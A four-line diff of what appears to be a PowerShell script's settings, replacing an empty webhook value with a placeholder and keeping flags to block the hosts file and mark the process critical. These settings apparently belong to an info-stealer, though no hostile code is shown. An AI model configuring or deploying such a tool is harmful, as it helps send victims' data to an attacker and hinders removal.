@@ -1,4 +1,4 @@
-$webhook = ""
+$webhook = "YOUR_WEBHOOK_HERE" 
 $debug = $false
 $blockhostsfile = $true
 $criticalprocess = $true
